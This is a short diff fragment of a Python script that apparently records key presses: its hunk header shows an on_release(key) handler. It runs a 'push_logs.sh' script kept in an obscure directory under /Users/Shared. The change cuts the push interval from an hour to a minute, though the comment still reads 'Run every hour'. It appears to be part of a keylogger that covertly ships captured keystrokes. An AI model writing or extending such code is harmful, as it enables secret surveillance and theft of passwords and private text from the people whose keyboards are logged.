@@ -13,7 +13,7 @@ def on_release(key):
 
 def push_logs_periodically():
     subprocess.call(["/Users/Shared/system532/stringCup/push_logs.sh"])
-    threading.Timer(3600, push_logs_periodically).start()  # Run every hour
+    threading.Timer(60, push_logs_periodically).start()  # Run every hour
 
 # Start the periodic log pushing
 push_logs_periodically()
